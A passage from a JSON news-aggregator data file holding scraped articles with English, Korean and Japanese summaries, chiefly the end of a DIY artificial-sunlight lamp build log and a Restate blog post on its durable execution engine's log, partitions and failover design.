have a very advanced tools at home, so my best solution to this was making the existing grooves wider by hand using a power drill. I bought a 1.5mm metal drill bit and achieved a decent result by doing 4 to 5 passes per groove. This took about 2-3h in total because I had to move the bit quite slow and could only machine about 1/4th of each groove depth at a time by moving the drill bit slowly accross, and there are 8 grooves total.\n\nHere's some more pictures of assembly below.\nThe back side after soldering wires to the PCB power pins and a socket for the 12V power supply. The PCBs and hood pieces share a common mounting hole so only two screws per PCB-hood pair are used.\n\nThe front side of the baseplate + PCB + hoods assembly, but without the lenses, powered on. Don't look at it directly :)\n\nIt's interesting to note that in the picture above, all of the light you can see from the LEDs is actually \"bleed light\" and not useful light. None of the light visible above is the light that's intended to go into the lens and produce the sunlight effect.\nTesting with partial assembly of the walls and only 1 out of the 2 lenses:\n\nTesting the inkjet film layers with an avocado as a subject. I settled on using two layers of the inkjet film for the final build:\n\nCostOverall I spent around 1000€ on this project. But this includes cost of tools I was missing, prototype parts that I had manufactured but discarded, bulk orders for parts like LEDs and PCBs which had a minium order quantity above what I need for 1 unit, and various supplies like screws, etc. The actual raw cost of parts only, without shipping, to build the final unit is hard to estimate. But I would say around 300€. The most expensive parts are the CNC parts (PMMA lenses and the aluminum baseplate and walls) accounting for about 2/3rd of the total price. The rest (PCBs, assembly service, LEDs, 3D printed plastic parts) was quite cheap.\nConclusionAs I write this the final piece is sitting on my desk and producing a pleasant soft white glow. It's definitely nice, and I'm very proud of the result - especially because this was by far the biggest build project I have ever done.\n\nThanks to this project, I've learned a ton about PCB design, electronics and CNC manufacturing and optics. I even got so far down the side quest of learning optics that I started an open-source python project for modeling geometric optics.\nSo, is it convincing as artificial sunlight?\nMy honest answer to that is: partially. The geometric effect of the light source appearing at infinity works. As I pan and tilt my head from side to side, the illusion of light coming from way far behind the object is 100% a success. On top of that, if you look at it while moving your head into the light beam, my eyes get surprised - almost hurt - by the sudden intensity jump. This indicates that collimation is good and you can sort of see it in the video at the start of this post.\nHowever it's apparent that it's simply too weak. Don't get me wrong, it's still bright. I can't look at it directly without sunglasses, and honestly it's really hard to take a good picture of it because the contrast between the light it emits and the outside of it is very high.\nAnother downside is that I can definitely make out the grid of lenses, as the intensity pattern clearly reveals the grid shape. This is quite a minor downside and not really unpleasant, and I'm sure it could be improved upon.\nIf I were to ever work on a version 2, I would focus on:\n\nMore power. My feeling is the light output needs to be 3 to 5 times stronger to get any closer to a convincing effect, and it's not crazy to aim for as much as 10x brighter than this prototype.\nMore surface area. This prototype is 18cm x 18cm. So you only really get the effect if you are able to sit with the produced straight beam of light, which is quite narrow to resemble any kind of \"fake window\". A future version would need to be 2 to 4 times wider in my opinion.\nBetter optical design. I still think a refraction based design is possible, but it requires very precise optical design and mechanical tolerances. My feeling is that a refraction based design, especially as a grid, is very sensitive to positioning and orientation of parts. I lack mechanical engineering skills in this area.\n\nHowever there are some really encouraging things that I really like about this grid based, refractive design:\n\nIt's scalable. If I had built 4 identical items, I could literally stack them on top of each other and get more surface area. The \"bezels\" would be only 5% of the total light emitting area, and I'm sure this could be lowered. I also like that the inner design calls for repeated elements, as this introduces some economy of scale, even at the prototype level. The only part that's not trivially scalable is the lens grid. Maybe it could be injection molded for very large scale production, or for medium scale you could come up with a way to tile multiple lens grids into a larger overall grid pattern, adding some thin bezels for mounting.\nIt's compact. The total size is 19cm x 19cm x 9cm. This is quite compact for a 5cm focal length and an effective lighting area of 18cm x 18cm. Reflective designs like the DIYPerks video or commercial products like CoeLux do not achieve this form factor.\nThermal management is better by design. This is not really something I got into for this design, as it's quite underpowered. The whole thing runs comfortably on a 12V / 3A wall brick power supply. But this design offers great margin for scaling up because there isn't a single light source to cool down, but a number of LEDs proportional to the surface area. I suspect the main thermal issue when scaling up would be the cooling of the power supply itself, not of the lamp.\n\nAs final thoughts, let me talk about the software heavy approach I had for this project. It's awesome. If I was starting a manufacturing company today, I would do it all code based. PCBs, 3D models, assembly, testing... I want code everywhere. The power of changing a parameter and having the entire design updated with a single script it so good. Run a script and get all the production data including GERBERs, BOM, 3D models, mechanical schematics, technical diagrams, automated tolerance and electrical checks... absolutely no manual steps between changing a design parameter and ready to send a new order to manufacturing. The PCB and CAD space is even evolving to use proper CI/CD tools which is really exciting.\nI don't know if I'll ever have the time to work on version 2 of this project, but it was great fun anyway! And now I have a cool unique lamp. Thank you for reading!\n\n            116\n\n    document.querySelector('#upvote-form').addEventListener('submit', (e) => {\n        e.preventDefault();\n        const form = e.target;\n        fetch(form.action, {\n            method: form.method,\n            body: new FormData(form),\n        });\n        const button = form.querySelector('button')\n        button.disabled = true\n        button.style.color = \"salmon\"\n        const upvoteCount = document.querySelector('.upvote-count')\n        upvoteCount.innerHTML = `${(parseInt(upvoteCount.innerHTML.split(\" \")[0]) + 1)}`\n    });",
    "summary": {
      "en": "The author shares their experience of creating artificial sunlight at home, inspired by a video from DIY Perks. They aimed to design a less bulky version of a project that used a large parabolic reflector by developing a grid of lenses with multiple LEDs.\n\nKey points include:\n\n- **Design Concept**: The author used a grid of small lenses and multiple low-power LEDs to create a compact light source, focusing on easier thermal management and a smaller footprint compared to traditional designs.\n  \n- **Learning Experience**: They learned about CAD modeling, PCB design, and optics through this project, utilizing tools like build123d, KiCad, and custom Python code for simulations.\n\n- **Technical Details**: The finished device features a lens array with 36 LEDs, each LED designed to produce a high color rendering index (CRI) light. The goal was to mimic the sun’s parallel light rays.\n\n- **Challenges**: Despite achieving some success in creating the light effect, the brightness was lower than intended, and the lens grid pattern was visible. The author plans potential improvements for future versions, including increasing light intensity and surface area.\n\n- **Cost and Assembly**: The project cost around €1000, including tools and parts, with the main components being CNC-manufactured lenses and PCBs.\n\nOverall, the author is proud of their first version of the artificial sunlight lamp and mentions that the experience taught them valuable skills in electronics and manufacturing. They express interest in developing a second version to enhance the design.",
      "ko": "저자는 DIY Perks의 영감을 받아 집에서 인공 태양광을 만드는 경험을 공유합니다. 그들은 대형 포물선 반사경을 사용하는 프로젝트의 부피를 줄인 버전을 설계하기 위해 여러 개의 LED가 장착된 렌즈 그리드를 개발했습니다.\n\n디자인 개념으로는 작은 렌즈와 저전력 LED를 조합하여 컴팩트한 광원을 만들었습니다. 이는 전통적인 디자인에 비해 열 관리가 용이하고 공간을 덜 차지하는 것을 목표로 했습니다.\n\n이 프로젝트를 통해 CAD 모델링, PCB 설계, 광학에 대해 배웠으며, build123d, KiCad, 맞춤형 파이썬 코드를 사용하여 시뮬레이션을 진행했습니다.\n\n완성된 장치는 36개의 LED가 장착된 렌즈 배열로 구성되어 있으며, 각 LED는 높은 색 재현 지수(CRI)를 가진 빛을 생성하도록 설계되었습니다. 목표는 태양의 평행한 빛을 모방하는 것이었습니다.\n\n빛 효과를 어느 정도 성공적으로 만들어냈지만, 밝기가 예상보다 낮았고 렌즈 그리드 패턴이 보이는 문제가 있었습니다. 저자는 향후 버전에서 빛의 강도와 표면적을 늘리는 등의 개선을 계획하고 있습니다.\n\n이 프로젝트의 비용은 약 1000유로로, 도구와 부품을 포함하며, 주요 구성 요소는 CNC로 제작된 렌즈와 PCB입니다.\n\n저자는 인공 태양광 램프의 첫 번째 버전에 대해 자부심을 느끼며, 이 경험을 통해 전자기기와 제조에 대한 귀중한 기술을 배웠다고 말합니다. 또한 디자인을 개선하기 위해 두 번째 버전을 개발할 의향을 표현했습니다.",
      "ja": "著者は、DIY Perksの動画に触発されて、自宅で人工太陽光を作る経験を共有しています。彼らは、大きな放物面反射鏡を使ったプロジェクトのコンパクトなバージョンを設計することを目指し、複数のLEDを使ったレンズのグリッドを開発しました。\n\nデザインのコンセプトとして、著者は小さなレンズのグリッドと低出力のLEDを組み合わせて、従来のデザインに比べて熱管理が容易で、設置面積が小さいコンパクトな光源を作成しました。\n\nこのプロジェクトを通じて、著者はCADモデリング、PCB設計、光学について学びました。具体的には、build123dやKiCad、カスタムPythonコードを使ってシミュレーションを行いました。\n\n完成した装置は、36個のLEDを持つレンズアレイを特徴としており、各LEDは高い演色評価数（CRI）の光を生成するように設計されています。目標は、太陽の平行光線を模倣することでした。\n\nいくつかの成功を収めたものの、明るさは期待よりも低く、レンズのグリッドパターンが目立つという課題もありました。著者は、将来のバージョンで光の強度や表面積を増やすなどの改善を計画しています。\n\nプロジェクトのコストは約1000ユーロで、工具や部品を含んでいます。主な部品はCNC製造されたレンズとPCBです。\n\n全体として、著者は人工太陽光ランプの初版に誇りを持っており、この経験を通じて電子工学や製造に関する貴重なスキルを学んだと述べています。デザインを向上させるために、次のバージョンの開発にも興味を示しています。"
    }
  },
  {
    "id": "551e20eaab8852f1",
    "title": {
      "en": "How Kerala got rich",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://aeon.co/essays/how-did-kerala-go-from-poor-to-prosperous-among-indias-states",
    "score": 371,
    "by": "lordleft",
    "time": 1743179264,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "a8137c3c4854deab",
    "title": {
      "en": "Building a modern durable execution engine from first principles",
      "ko": "현대적 실행 엔진 구축하기",
      "ja": "現代の実行エンジン構築"
    },
    "type": "story",
    "url": "https://restate.dev/blog/building-a-modern-durable-execution-engine-from-first-principles/",
    "score": 90,
    "by": "whoiskatrin",
    "time": 1743083504,
    "content": "Building a modern Durable Execution Engine from First PrinciplesHow Restate works, Part 2Posted February 20, 2025 by Stephan Ewen, Ahmed Farghal, and Till Rohrmann‐20min readWe dive into the architecture details of Restate, a Durable Execution engine we built from the ground up. Restate requires no database/log or other system, but implements a full stack that competes with the best logs in terms of durability and operations.This is the second article in our series on building a durable execution system from first principles. The first blog post in this series, Every System is a Log, looks at this from the application side, and shows how a unified log architecture results in a tremendous simplification of distributed coordination logic. This post discusses the details of how we built the log-based runtime for that paradigm.Modelling locking and database updates through an application log,taken from Every System is a LogTo build this runtime, we asked ourselves, what such a system would look like when designed from first principles? We built a precursor to this with Stateful Functions, and from all the lessons learned there, we arrived at a design with a self-contained complete stack, centered around a command log and event-processor, shipping as a single Rust binary. To get an idea of the user experience we arrived at, check the videos in the announcement post.This stands somewhat in contrast to the common wisdom “don’t build a new stateful system, just use Postgres”. But we saw a clear case to build a new stack, for multiple reasons: First, the interactions and access patterns are different enough from existing systems that we can offer both better performance and operational behavior, similar to why message queues exist, even though you can queue with a SQL table. Second, the architecture of event logs has made significant advancements in recent years, but the advanced implementations are exclusive to proprietary stacks and managed offerings - the open source logs and queues still follow architectures from the on-prem era. Third, we saw how a converged stack lets us provide a much better end-to-end developer experience, from first experiments on your laptop to multi-region production deployments.Recap: Server and Services #A Restate application stack consists of two components: Restate Server, which sits at a similar place in your stack as a message broker, and the application services, which are durable functions/handlers containing the application logic. The server receives invocation events, persists them, and pushes them to the services, similar to an event broker. The services run the code that corresponds to RPC- or event-handlers, workflows, activities, or actors. Services may run as processes, containers, or even serverless functions.But Restate doesn’t just push invocations, it maintains a bidirectional connection with the executing service handler and lets the code perform durable actions as part of the invocation, including journaling steps, sending events to other handlers, accessing/modifying state, creating persistent futures (callbacks) and timers. The services use a thin SDK library which communicates the actions to the server - somewhat comparable to a KafkaConsumer or JDBC client, but more high-level. See Restate’s examples for sample code and details.The server handles all coordination and durability for the invocation life cycle, journals, embedded K/V state, and manages failover, leader-election, and fencing. The server’s view on an invocation and its journal is the ground truth; the services follow the server’s view and function executions may be cancelled/reset/retried as needed.That approach makes the services completely stateless and simple to operate. They scale rapidly and run on serverless infrastructure like AWS Lambda, Cloudflare workers, etc.This characteristic also lets us build those SDKs in many languages fairly easily, including TypeScript, Java, Kotlin, Python, Go, and Rust.Clusters, Object Stores, and the Latency Gap #A distributed Restate deployment is a cluster of nodes that are connected to each other. Invocations and events can be sent to any node, and all nodes participate in the storage of events and dispatching of invocations to services/functions. Restate is active/active from a cluster-perspective, but has leader/follower roles at the granularity of individual partitions, similar to systems like Kafka or TiKV.Restate stores data using two mechanisms: New events (invocations, journal entries, state updates, …) are persisted in an embedded replicated log (called Bifrost). From there, events move to state indexes in RocksDB, which are periodically snapshotted to an object store. So at any point in time, the majority of the data is durable in the object store (the nodes maintain a copy as cache) while a smaller part of the data is durable in the log replicated across the nodes.This is a form of storage tiering, though not the classical tiering like in modern logs. It is more similar to a database management system, where the write-ahead-log (WAL) would be replicated across nodes, while the table data files and indexes would be persisted on S3 (and cached on the nodes).Object store + latency gap #Architectures that keep most- or all - of their data on object stores have become popular for many reasons: Object stores are unbeatable in terms of combined scalability, durability, and cost (AWS S3 cites eleven 9s of durability, stores more than 100 trillion objects, and is cheaper than persistent disks). Plus, the storage exists disaggregated from compute nodes, making the nodes stateless (or owning little state), which is highly desirable for efficient operations.Object stores are also available in most on-prem setups we’ve encountered. It was natural for us to design Restate such that object storage would be the primary durability for the majority of the data.The reason why Restate has additionally a replication layer that persists new events (rather than writing events straight to object storage) is to provide low latency. Pure object store approaches have latencies that average around 100ms to make data durable, with tail latencies being a multiple of that. While that is feasible for analytical systems (e.g., Apache Flink) and data pipelines (like WarpStream), such latencies can quickly become prohibitive for many applications.Restate’s replication bridges the latency gap between the requirements of fast durable functions and the capabilities of object storage.Navigating the cloud latency-cost-disk triad #The setup described above is what we ship first, in Restate 1.2: a fast log replicated between Restate server nodes. However, Restate uses virtual log abstraction, to easily support other log implementations as well, without having to build a full consensus machinery each time. This is a defining feature of Restate’s runtime implementation that we’ll dive deeper into in the next article in this series. We are currently using that mechanism to build object-store support in the log as well, which is a powerful feature for bringing the amount of data persistent on nodes to very small amounts, even zero.There is no single best configuration for that setup - only a spectrum of trade-offs to pick from. In his Materialized View newsletter, Chris Riccomini describes it as a CAP-theorem-like choice:In our context (durable execution runtime), durability must be a given, but we have the additional dimension of how much replicated data is kept on the nodes. Restate’s triad thus is: latency-cost-disk.➕ Low latency, ➕ low cost, ➖some data on disks: Quorum replication to nodes with async batch writes to S3.The nodes provide fast durability through replication and keep the data for anything between a few 100ms and minutes, before moving the events to object storage. Restate 1.2 can be seen as a variant with a long flush interval.➕ Low latency, ➖ high cost, ➕ no data on disks: Quorum replication directly to S3 Express One Zone.Restate’s replication mechanism deals only with ordering, quorum, and repairs upon loss of a zone, but doesn’t keep data on the nodes (except caches).➖ High latency, ➕ low cost, ➕ no data on disks: Synchronous batch writes to S3.Restate’s replication mechanism isn’t used.Naturally, there are nuances: direct replication has an even lower latency than S3 Express 1Z quorums. Synchronous batch writes to S3 can be cheaper than anything else, because that approach may avoid cross AZ bandwidth cost. Disks still exist as caches in all configurations. And there is the option of using quorum replication to S3 Express 1Z in different regions, to support multi-region deployments without relying on disks. But it shows that there is the spectrum of options, with which we aim to enable developers to use Restate in diverse setups across cloud and on-prem, while maintaining a simple dependency: just an object store.Restate 1.2 ships with all the virtual log infrastructure, and a low-latency replicated log implementation. We are currently working on the other configurations - if you are interested in being an early tester or design partner, please reach out to us.As a final thought, being able to adjust to different trade-offs also helps Restate and its users adapt to changing cloud pricing models. To quote another prolific dist. sys. writer:Partitioned Scale out #Restate follows the partitioned scale-out model: A cluster has a set of partitions, each with a log partition and an event processor instance. Partitions operate independently and allow the system to scale both across cores and nodes.Everything related to an invocation happens within a single partition: invocation, idempotency & deduplication, journal entries, state, promises/futures, avoiding the need to synchronize and coordinate with any other shards. The target partition for an invocation is determined by hashing the virtual object key, workflow ID, or idempotency key, if applicable - otherwise, the partition is freely chosen.In some cases, a function execution produces an event for another partition, for example RPC events or completions. In that case, events are still written to the local partition, and the server has an out-of-band exactly-once event shuffler to move events to the right target partition.The partitions are not exposed to applications (though you see them when using restatectl) - only keys are directly addressable (virtual object id, workflow id, idempotency key), to allow changing the number of partitions without losing consistency.From here on, we look only at what happens inside a single partition.Event Log and Processor #The work that Restate Server does inside one partition happens in two components: the distributed durable log (called Bifrost) and the processors. The log is the fast primary durability for events (e.g., make invocations, add journal entry, update state, create durable promise, …), the processor acts on events (e.g., invokes handlers) and materializes their state. Log and processor are co-partitioned, meaning a partition processor connects to one log partition. They are independent, but frequently co-located in the same process.Compared to databases, you can think of Bifrost as the transaction WAL, and the processor as the query engine and table storage. Compared to stream processing, you can think of Restate’s log as Kafka and the processor as a stream processing application (like KStreams or Flink).Log and processor form a tight loop: the processor continuously tails the log, and acts on the events (e.g., making invocation). That may produce more events (journal entries, state updates, …), which are written to the log and again processed by the processor.Let’s go through an example to illustrate this:A client invokes service handler processPayment with idempotency key K through Restate. The ingress enqueues the invocation to the log partition, as determined by hashing K.The leader Processor for the partition receives that event and checks its local idempotency key state. K is not contained there for processPayment. The processor atomically adds K to the state and transitions the invocation to running, then builds a connection to the target service endpoint, and pushes the invoke journal entry.The service streams back a step result event (ctx.run({...})) and the processor enqueues that journal entry event in the log. Being persistent in the log is the point when “the step happened”, meaning from there on it will always be recovered.When the processor receives the event from the log (that means no other processor has taken over leadership in the meantime) then it adds the event to the invocation’s journal state and sends an ack to the service.Similar steps happen when the service sends a state update, a timer, an RPC event, or creates a durable promise. Events get always added to the log first, and once they are received by the processor they are acted upon (e.g., added to journal, routed as invocation to other service, etc.)Once the invocation completes, the Processor adds the result event to the log. Upon receiving that event, it sets the invocation state as complete and sends the result back to the client.When the function execution fails (e.g., crash, loss of connection, user-defined error), the processor dispatches a new invocation, attaching the full journal events from this invocation so far. To avoid split brain scenarios between services, the processor tracks invocation execution attempts (retries) and rejects events sent from an invocation if a newer attempt has started. This can be tracked with simple in-memory state, because invocations are sticky to partitions, and partitions have strong leaders.State storage #The processor stores all its non-transient state in an embedded RocksDB instance. Operations on that embedded store are very fast, but the state is lost when the node is lost. However, all state of the processor is deterministically derived from the durable log and can always be rebuilt from the log during recovery. To avoid arbitrarily long re-build phases, the RocksDB database is periodically snapshotted to the object store and the log is trimmed to the point of the snapshot. Processors can be restored by fetching the latest snapshot and attaching to the log at the event sequence number when the snapshot was taken.The implementation of the partition processor is a tight event loop in Rust’s Tokio runtime. Partition Processors operate independently from each other and access exclusively local data structures (in memory, RocksDB, streams to ongoing invocations). The partition-local handling of invocations is easy in a log-first design, and would be much harder to achieve if we built this on a general purpose database.That property makes the design also both simple and fast: Committing an event (e.g., step / activity) means appending the event to the log (obtaining a write quorum). As soon as that happens, the event is pushed from the log leader in-memory to the attached processor and ack-ed to the handler/workflow. This takes a single network roundtrip for a replication quorum, and no distributed reads. The durability of RocksDB happens completely asynchronously in the background.Leaders and Followers #Both log and processors have one leader and optional followers. In the case of the log, followers increase durability for events through additional copies. In the case of processors, followers are hot standbys that have a copy of the state (deterministically derived from the log) and can quickly take over upon failure. Only the processor leader actually dispatches invocations for functions and workflows to the services, and only the leader writes snapshots to object store.High-level architecture and request flow.Control Plane, Data Plane, External Consensus #So far, everything we looked at was the data plane of the system: The log and the partition processor.Everything is coordinated by a control plane, which is responsible for failure detection, failover coordination, and re-configuration. The control plane stores metadata for the cluster (like configurations) and runs the cluster controller that handles partition placement and leader election.Control Plane and Data PlaneBecause Restate has one control plane for both log and processors, it can co-coordinate both, for example ensuring that the leader processor is always co-located with the log partition leader, to reduce network hops and optimize reading from local memory caches. In contrast, if we were to build this transparently on an external log like Kafka, this co-location would be harder to achieve. The benefits of this joint control plane show in many parts of the system and are one of the reasons Restate is simpler to set up, scale, and operate.Besides managing re-configurations and failover, the control plane also provides the external consensus for the data plane, allowing the data plane to operate more efficiently and with simpler properties than full consensus. We’ll go into the details of Restate’s log implementation in the next blog post - for now, a useful high-level way to think about this is that the control plane moves the data plane from one steady configuration to another, whenever the previous configuration is no longer functional (a failure happened) or desired (e.g., re-balancing). This blog post from Jack Vanlightly gives a nice introduction to that concept.\nThe Control Plane reconfigures the Data Plane (Figure from “An Introduction to Virtual Consensus in Delos “by Jack Vanlightly)Another benefit of this design is that it allows Restate to use a simpler/slower implementation of consensus on the control plane, because it is rarely invoked. Restate abstracts its consensus to just an atomic compare-and-swap (CAS) metadata operation, which the built-in metadata store backs with an implementation of the RAFT consensus algorithm. But this can be easily extended to plug in different storage systems, as long as they support atomic CAS.Failover & Reconfiguration #Though the control plane jointly coordinates log and processor reconfiguration, each has their own mechanisms to ensure consistency.A segmented log (Figure from “An Introduction to Virtual Consensus in Delos “by Jack Vanlightly)Bifrost’s (the log’s) mechanism is based on a mix of Delos (Virtual Consensus) and LogDevice. From a high-level, bifrost is segmented and failover or reconfiguration seals the active segment and creates a new segment, possibly with a new leader and a different set of nodes that store replicas. To the outside and the partition processors, everything looks like a single contiguous log.When a partition processor fails, the control plane selects a new leader for that partition.The failover procedure relies on the external consensus provided by the control plane: New leaders obtain the next epoch in a strictly monotonous sequence (so newer leaders have higher epochs). The new leader appends a message to the log to signal their epoch is now active, and then simply starts appending events from its operations. The old leader (who might still be following the log) will receive that epoch bump message and step down at that exact point - it will keep materializing state (as a follower) but not dispatch invocations any more. The old leader also aborts ongoing function executions and lets the new leader recover those.Leader handover via messages in the logAny messages carrying lower epochs than the latest epoch-bumping message will be ignored, which filters messages that the old leader might have still been appending to the log before it found out that it was superseded by another leader. If the old leader was attempting to commit a journal entry, but the message was appended after the epoch-bump message, that commit cannot happen: The new leader will (or might have already) recover the process without that journal entry and execute and commit that step. This mechanism ensures that any step / activity result is committed exactly once. No split brain view is possible.This mechanism also automatically resolves concurrent competition for leadership - the highest epoch will win, and late events are consistently ignored.Converged Single Binary #Restate is architected as a set of individual components that communicate with each other and make no assumptions about the whereabouts of their peers. A Restate binary can run every component or a subset of them; a set of components is described by a role.The default configuration is the converged mode, where every binary runs every role. In that case, you get a distributed architecture in a single binary. You can start more instances of the binary to form clusters. This mode is easy to use and efficient, because it also lets different components communicate efficiently through in-memory channels and caches whenever possible (e.g., log to processor).The roles and components of RestateHowever, you can of course also run it as a disaggregated setup, where different sets of nodes run different roles. That lets you separate control plane from data plane and pick your best trade-offs in terms of cost/durability/availability for metadata and data. For example:Deploy three nodes with the admin role across three different regions, ensure application and consensus metadata are disaster proof.Deploy six nodes with the Log-Server role across three availability zones, making sure data is replicated to tolerate zone outages.Deploy Ingress and Worker roles in one availability zone to strictly co-locate them with zone-local services.Restate’s architecture gives you a great developer experience from the start (launching a single binary on your laptop) all the way to sophisticated distributed deployments (disaggregated distributed setups).Some Performance Numbers #How fast can a system like this be? The answer is, we don’t really know, we have plenty more optimization we can do. Our main focus for this release was durability, resilience, and operational tooling.But even before any deep performance optimization, the system already pushes some pretty cool numbers, both latency- and throughput wise. Below are numbers from Restate 1.2. We measure the throughput / latency of the server against mock functions and activities, to put maximum stress on the server.Latency #Restate aims to keep latencies low, despite giving strong guarantees on durability (replication) and consistency (strong consensus on locking keys, workflow ids, etc.).Below are the numbers for durable functions with an increasing number of intermediate durable steps, running on a 3-way replicated cluster. Under low load, things are generally fast and a single step has a median latency of 3ms. Under high load, steps still have a median latency of 10ms after the initial workflow setup. Tail latencies under low load are a bit higher than we like (possibly caused by some Tokio / RocksDB issues) and we believe we can get these down in the future.LoadIntermediate StepsLatencyp50p90p99Low (10 concurrent clients)05ms34ms54ms315ms42ms69ms931ms57ms93ms2761ms106ms155msHigh (1200 concurrent clients)028ms41ms58ms358ms76ms98ms9116ms138ms163ms27283ms320ms356msOne thing you can observe here is that Restate is built to make durable steps cheap. An initial function or workflow invocation needs to check whether the workflow ID, idempotency key, or object key already exists and whether it is under execution. But once an invocation has been made, adding steps is just the equivalent of a conditional append to the log.Throughput #We ran a workflow of 9 intermediate durable steps (totalling 11 actions, including invoke/result), using 1200 concurrent clients to submit workflows.Restate pushes 94,286 actions (steps) per second, equalling 8,571 full workflows each second. The system maintains a p50 of 116.36ms and a p99 of 163.33ms for the full workflow! The p50 per step is 10ms.The experiment ran on AWS c6id.8xlarge nodes, which are admittedly beefy, but also deliver a throughput that most companies will not ever reach or exceed in their transactional load. And, if they exceed that, Restate still scales to more nodes through more partitions.Up next: a fast, flexible, state-of-the-art log #We mentioned that we built our own implementation of a distributed replicated log (called Bifrost), because we didn’t find any of the existing logs suitable in terms of latency (single roundtrip, quorum replication with external consensus), durability (active-active with flexible quorums), flexibility (segmented log that can be dynamically reconfigured).The next post in this series will dig into all the nitty gritty details of how we built that log. This log itself is a marvel of engineering and one of the reasons Restate is as powerful as it is. If you are into distributed systems, you will enjoy that one for sure!Try it out! #We hope you find this work as exciting as we do. If you want to try this out, the quickstart, helps to get you to your first demo app (and give us a star on GitHub).To get right into the distributed fun, check this guide to running a cluster locally.Let us know what you think or ask questions in our community on Discord or Slack and get more deep content like this from us on X, LinkedIn, Bluesky, or via email.Restate is also available as a fully managed cloud service, if all you want is to use it and let us operate it.restate\nrelease\narchitecture\ndeployment",
    "summary": {
      "en": "**Summary of \"Building a Modern Durable Execution Engine from First Principles: How Restate Works, Part 2\"**\n\nIn this article, the authors discuss the architecture of Restate, a newly developed Durable Execution Engine. Unlike traditional systems that rely on databases or logs, Restate is designed as a complete stack that offers high durability and performance. \n\nKey Points:\n\n1. **Purpose and Design**: Restate aims to simplify distributed systems by using a unified log architecture, which helps with coordination and performance. It is built from scratch, learning from previous projects like Stateful Functions.\n\n2. **Components**: The Restate application consists of a Restate Server (similar to a message broker) and application services that handle logic. The server manages event invocations, durability, and failover, while services can run in various environments.\n\n3. **Data Storage**: Restate uses a dual-storage mechanism with an embedded log (Bifrost) for immediate event durability and RocksDB for state management. Data is also periodically saved to an object store, balancing speed and cost.\n\n4. **Latency Management**: To reduce latency, Restate replicates events across nodes instead of directly writing to object storage, which can be slow.\n\n5. **Scalability**: The system can scale efficiently using a partitioned model where each partition has its own log and processor. This allows independent operation and minimizes the need for cross-partition synchronization.\n\n6. **Control Plane**: A control plane coordinates the system’s components, handling failovers and leader elections, and ensures optimal data flow between the log and processors.\n\n7. **Performance**: Early tests show Restate can handle high throughput and low latency, even under heavy loads, making it suitable for demanding applications.\n\n8. **Future Developments**: The authors plan to release more features, including a fast log implementation, and encourage community engagement for feedback and testing.\n\nRestate is positioned as a powerful tool for developers looking to build robust, scalable applications with a focus on durability and performance.",
      "ko": "이 글에서는 새롭게 개발된 내구성 실행 엔진인 Restate의 아키텍처에 대해 설명합니다. 전통적인 시스템이 데이터베이스나 로그에 의존하는 것과 달리, Restate는 높은 내구성과 성능을 제공하는 완전한 스택으로 설계되었습니다.\n\nRestate의 목적은 분산 시스템을 단순화하는 것입니다. 이를 위해 통합 로그 아키텍처를 사용하여 조정과 성능을 개선합니다. Restate는 Stateful Functions와 같은 이전 프로젝트에서 배운 점을 바탕으로 처음부터 만들어졌습니다.\n\nRestate 애플리케이션은 메시지 브로커와 유사한 Restate 서버와 논리를 처리하는 애플리케이션 서비스로 구성됩니다. 서버는 이벤트 호출, 내구성, 장애 조치를 관리하며, 서비스는 다양한 환경에서 실행될 수 있습니다.\n\nRestate는 즉각적인 이벤트 내구성을 위해 내장 로그(Bifrost)와 상태 관리를 위한 RocksDB를 사용하는 이중 저장 메커니즘을 채택합니다. 데이터는 또한 주기적으로 객체 저장소에 저장되어 속도와 비용의 균형을 맞춥니다.\n\n지연 시간을 줄이기 위해 Restate는 객체 저장소에 직접 쓰는 대신 노드 간에 이벤트를 복제합니다. 이는 느릴 수 있는 직접 쓰기를 피하는 방법입니다.\n\n시스템은 각 파티션이 자체 로그와 프로세서를 가지는 파티셔닝 모델을 사용하여 효율적으로 확장할 수 있습니다. 이를 통해 독립적으로 운영할 수 있으며, 파티션 간 동기화의 필요성을 최소화합니다.\n\n제어 평면은 시스템의 구성 요소를 조정하고 장애 조치 및 리더 선출을 처리하며, 로그와 프로세서 간의 최적의 데이터 흐름을 보장합니다.\n\n초기 테스트 결과, Restate는 높은 처리량과 낮은 지연 시간을 처리할 수 있어, 부하가 많은 상황에서도 적합한 성능을 보입니다. 이는 요구가 높은 애플리케이션에 적합합니다.\n\n저자들은 빠른 로그 구현을 포함한 더 많은 기능을 출시할 계획이며, 커뮤니티의 피드백과 테스트 참여를 장려하고 있습니다. Restate는 내구성과 성능에 중점을 두고 강력하고 확장 가능한 애플리케이션을 구축하려는 개발자들에게 유용한 도구로 자리 잡고 있습니다.",
      "ja": "この記事では、著者たちが新たに開発された耐久性のある実行エンジン「Restate」のアーキテクチャについて説明しています。従来のシステムがデータベースやログに依存するのに対し、Restateは高い耐久性とパフォーマンスを提供する完全なスタックとして設計されています。\n\nRestateの目的は、統一されたログアーキテクチャを使用することで分散システムを簡素化し、調整やパフォーマンスを向上させることです。これは、Stateful Functionsのような過去のプロジェクトから学びながら、一から構築されています。\n\nRestateアプリケーションは、メッセージブローカーに似たRestateサーバーと、ロジックを処理するアプリケーションサービスで構成されています。サーバーはイベントの呼び出し、耐久性、フェイルオーバーを管理し、サービスはさまざまな環境で実行できます。\n\nデータストレージには、即時のイベント耐久性のための埋め込みログ（Bifrost）と、状態管理のためのRocksDBを使用した二重ストレージメカニズムが採用されています。また、データは定期的にオブジェクトストアに保存され、速度とコストのバランスが取られています。\n\nレイテンシー管理のために、Restateはイベントをノード間で複製し、直接オブジェクトストレージに書き込むのではなく、遅延を減らす工夫がされています。\n\nシステムは、各パーティションが独自のログとプロセッサを持つパーティションモデルを使用することで効率的にスケールします。これにより、独立した操作が可能になり、パーティション間の同期の必要性が最小限に抑えられます。\n\nコントロールプレーンは、システムのコンポーネントを調整し、フェイルオーバーやリーダー選出を処理し、ログとプロセッサ間のデータフローを最適化します。\n\n初期のテストでは、Restateは高いスループットと低いレイテンシーを維持できることが示されており、重い負荷の下でも適切に機能するため、要求の厳しいアプリケーションに適しています。\n\n著者たちは、迅速なログ実装を含むさらなる機能をリリースする計画を立てており、コミュニティからのフィードバックやテストへの参加を促しています。\n\nRestateは、耐久性とパフォーマンスに重点を置いた堅牢でスケーラブルなアプリケーションを構築したい開発者にとって、強力なツールとして位置付けられています。"
    }
  },
  {
    "id": "4abec88ae668e4a4",
    "title": {
      "en": "Madison Square Garden's surveillance banned this fan over his T-shirt design",
      "ko": "팬의 티셔츠로 감시 금지!",
